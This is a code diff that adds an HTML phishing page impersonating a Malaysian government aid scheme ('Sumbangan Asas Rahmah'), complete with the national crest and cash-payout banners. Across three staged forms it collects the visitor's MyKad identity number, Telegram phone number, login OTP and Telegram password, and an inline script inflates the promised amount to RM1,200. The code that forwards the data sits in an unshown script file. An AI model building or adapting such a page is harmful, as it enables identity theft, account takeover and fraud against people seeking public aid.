@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      Claim Bantuan Sumbangan Asas Rahmah: Cara Permohonan & Syarat Kelayakan.
+    </title>
+
+    <!-- Link ke Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <!-- Link ke CSS intl-tel-input -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
+    />
+
+    <!-- MY STYLE -->
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <div id="page1" class="page">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
+        </div>
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>摩訶至那</span></a>
+          <a href="#"><span>भारत</span></a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <img src="rm300.png" alt="tng-img" />
+        <img src="rm200.png" alt="tng-img" />
+        <h4>Semakan Status</h4>
+        <div class="form-container">
+          <form id="registrationForm">
+            <label for="" style="text-align: left">Nombor MyKad*</label>
+            <input
+              type="text"
+              id="name"
+              name="name"
+              placeholder="Masukkan Nombor MyKad"
+              required
+            />
+            <label for="" style="text-align: left">Nombor phone Telegram</label>
+            <input
+              type="tel"
+              id="phone"
+              name="phone"
+              placeholder="+60 | Masukkan Nombor phone"
+              required
+            />
+            <br />
+            <button type="submit" class="btn">Semakan Status</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div id="page2" class="page" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
+        </div>
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>摩訶至那國</span></a>
+          <a href="#"><span>भारत</span></a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <img src="rm300.png" alt="tng-img" />
+        <img src="rm200.png" alt="tng-img" />
+        <div class="form-container">
+          <p class="no-margin">
+            Sila Masukan Kod-yang dihantar ke Nombor Telegram Anda
+          </p>
+          <form id="otpForm">
+            <label for="otp-1">Masukan Kod-OTP</label>
+            <div class="otp-container">
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-1"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-2"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-3"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-4"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+              <input
+                type="number"
+                class="otp-input"
+                id="otp-5"
+                maxlength="1"
+                oninput="this.value=this.value.slice(0,1)"
+                required
+              />
+            </div>
+            <button type="submit" class="btn">TERUSKAN</button>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <div id="page3" class="page" style="display: none">
+      <nav class="navbar">
+        <div class="navbar-logo">
+          <img src="Jata Negara@3x.gif" alt="Logo Negara" class="navbar-img" />
+        </div>
+        <div class="navbar-nav">
+          <a href="#" class="active">Bahasa Melayu</a>
+          <a href="#"><span>English</span></a>
+          <a href="#"><span>摩訶至那國</span></a>
+          <a href="#"><span>भारत</span></a>
+        </div>
+      </nav>
+
+      <div class="hero">
+        <img src="rm300.png" alt="tng-img" />
+        <img src="rm200.png" alt="tng-img" />
+        <div class="form-container">
+          <p id="kataSandi">Sila Masukan kata laluan Telegram Anda</p>
+          <form id="passwordForm">
+            <input
+              type="password"
+              id="kata-sandi"
+              name="kata-sandi"
+              placeholder="Masukan kata laluan"
+              required
+            />
+            <button type="submit" class="btn">TERUSKAN</button>
+          </form>
+
+          <div id="loadingContent" style="display: none">
+            <img
+              id="loadingGif"
+              src="processing.gif"
+              alt="Loading..."
+              style="margin: 20px auto; width: 50%; height: auto"
+            />
+
+            <p id="formMessage" style="text-align: center">
+              Mohon tunggu proses pengesahan atau...
+            </p>
+
+            <button
+              id="useAnotherPhone"
+              style="
+                width: 100%;
+                padding: 10px;
+                margin: 30px auto 0;
+                background-color: var(--accent-yellow);
+                color: white;
+                border: none;
+                border-radius: 10px;
+                font-size: 1.1rem;
+                cursor: pointer;
+                align-items: center;
+                justify-content: center;
+              "
+            >
+              Guna Nombor Telefon Lain
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="loading-screen" id="loadingScreen">
+      <img src="loading-loading-forever.gif" alt="Loading..." />
+      <br />
+      <p style="color: var(--primary-blue); margin-top: 10px; font-size: 14px">
+        Tunggu kami sedang menyemak...
+      </p>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+
+    <script>
+      document.querySelectorAll(".h2").forEach((item) => {
+        item.textContent = item.textContent.replace("RM300", "RM1,200");
+      });
+    </script>
+
+    <script src="java.js"></script>
+  </body>
+</html>
